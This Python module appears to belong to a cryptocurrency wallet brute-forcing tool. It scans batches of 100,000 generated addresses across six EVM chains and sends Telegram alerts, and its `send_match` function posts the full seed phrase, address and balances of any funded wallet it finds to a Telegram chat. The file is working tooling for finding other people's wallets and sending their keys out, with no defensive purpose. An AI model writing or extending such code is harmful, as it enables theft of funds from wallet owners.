import aiohttp
from config import TELEGRAM_BASE, TELEGRAM_CHAT_ID, CHAIN_SYMBOLS


async def _send(text: str) -> None:
    try:
        async with aiohttp.ClientSession() as session:
            await session.post(
                f"{TELEGRAM_BASE}/sendMessage",
                json={"chat_id": TELEGRAM_CHAT_ID, "text": text, "parse_mode": "HTML"},
                timeout=aiohttp.ClientTimeout(total=10),
            )
    except Exception:
        pass


async def send_match(
    address: str,
    seed_phrase: str,
    chain_balances: dict,
    has_tx: bool,
    has_token_tx: bool,
) -> None:
    # Build chain balance lines (only show chains with balance)
    balance_lines = ""
    for chain, bal in chain_balances.items():
        if bal > 0:
            symbol = CHAIN_SYMBOLS.get(chain, "?")
            balance_lines += f"  • {chain.capitalize()}: {bal:.6f} {symbol}\n"

    if not balance_lines:
        balance_lines = "  • None\n"

    text = (
        "🎯 <b>Match Found!</b>\n"
        f"<code>{address}</code>\n\n"
        f"🔑 <b>Seed:</b>\n<code>{seed_phrase}</code>\n\n"
        f"💰 <b>Balances:</b>\n{balance_lines}"
        f"📜 <b>ETH Transactions:</b> {'Yes' if has_tx else 'No'}\n"
        f"🪙 <b>ERC-20 Tokens:</b> {'Yes' if has_token_tx else 'No'}"
    )
    await _send(text)


async def send_batch_complete(batch_number: int, total_checked: int, matches: int) -> None:
    text = (
        f"✅ <b>Batch #{batch_number} Complete</b>\n"
        f"Addresses checked: <b>{total_checked:,}</b>\n"
        f"Matches found: <b>{matches}</b>\n\n"
        "🔄 Generating next batch..."
    )
    await _send(text)


async def send_new_batch_start(batch_number: int) -> None:
    text = (
        f"🚀 <b>Batch #{batch_number} Started</b>\n"
        f"Scanning {100_000:,} new addresses.\n"
        f"Chains: Ethereum · BSC · Polygon · Arbitrum · Base · Optimism\n"
        f"Tokens: ERC-20 included"
    )
    await _send(text)


async def send_rate_limit_wait(reset_in_seconds: int) -> None:
    h, rem = divmod(reset_in_seconds, 3600)
    m = rem // 60
    text = (
        "⏳ <b>Daily API limit reached</b>\n"
        f"Resuming in <b>{h}h {m:02d}m</b> (resets at 00:00 UTC)"
    )
    await _send(text)


async def send_summary(total_checked: int, matches_found: int) -> None:
    text = (
        "✅ <b>Scan Complete!</b>\n"
        f"Addresses checked: <b>{total_checked:,}</b>\n"
        f"Matches found: <b>{matches_found}</b>"
    )
    await _send(text)
